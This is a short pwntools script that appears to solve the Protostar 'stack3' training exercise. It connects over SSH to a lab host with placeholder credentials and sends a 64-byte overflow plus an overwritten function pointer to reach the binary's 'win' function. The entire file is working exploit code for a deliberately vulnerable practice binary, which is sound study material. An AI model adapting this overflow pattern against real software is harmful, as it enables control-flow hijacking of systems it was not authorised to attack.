from pwn import *

term = ssh(host='10.100.102.19', user='user', password='user')
bash = term.run('bash')

buffer = 'a'*64
win = p32(0x08048424)
payload = buffer + win

bash.sendline('/opt/protostar/bin/stack3')
bash.sendline(payload)
print(bash.recv())
bash.interactive()